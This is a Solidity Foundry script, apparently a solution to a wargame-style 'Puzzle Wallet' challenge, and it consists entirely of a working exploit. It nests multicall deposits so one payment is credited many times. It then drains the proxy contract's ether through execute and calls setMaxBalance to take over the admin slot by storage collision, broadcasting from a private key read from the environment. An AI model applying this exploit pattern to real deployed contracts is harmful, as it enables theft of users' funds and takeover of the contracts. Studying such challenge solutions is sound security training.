//SPDX-License-Identifier: MIT

pragma solidity 0.8.21;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ExploitPuzzleWallet is Script {
    address PUZZLE_PROXY = 0x83d0f6f0d3930da31Bf0AC0F8d93Db1b1Df5802D;
    IPuzzleProxy proxy = IPuzzleProxy(PUZZLE_PROXY);

    function run() public {
        uint256 pk = vm.envUint("PK");
        address me = vm.addr(pk);
        uint256 walletBalance = address(proxy).balance;
        uint256 value = 0.0002 ether;
        uint256 times = (walletBalance + value) / value + 1;
        bytes[] memory batch = _makeBatch(0, times);

        vm.startBroadcast(pk);

        proxy.multicall{value: value}(batch);
        proxy.execute{value: 1}(me, address(proxy).balance + 1, "");
        proxy.setMaxBalance(uint160(me));

        vm.stopBroadcast();

        console.log("Wallet ETH: ", address(proxy).balance);
        console.log("Admin: ", proxy.maxBalance());
    }

    function _makeBatch(
        uint256 layers,
        uint256 maxLayers
    ) internal returns (bytes[] memory) {
        if (layers >= maxLayers - 1) {
            bytes[] memory latestBatch = new bytes[](1);
            latestBatch[0] = abi.encode(proxy.deposit.selector);
            return latestBatch;
        }

        bytes[] memory batch = new bytes[](2);

        batch[0] = abi.encode(proxy.deposit.selector);
        batch[1] = abi.encodeWithSelector(
            proxy.multicall.selector,
            _makeBatch(layers + 1, maxLayers)
        );

        return batch;
    }
}

interface IPuzzleWallet {
    function maxBalance() external returns (uint256);

    function init(uint256 _maxBalance) external;

    function setMaxBalance(uint256 _maxBalance) external;

    function addToWhitelist(address addr) external;

    function deposit() external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function multicall(bytes[] calldata data) external payable;
}

interface IPuzzleProxy is IPuzzleWallet {
    function proposeNewAdmin(address _newAdmin) external;

    function approveNewAdmin(address _expectedAdmin) external;

    function upgradeTo(address _newImplementation) external;
}
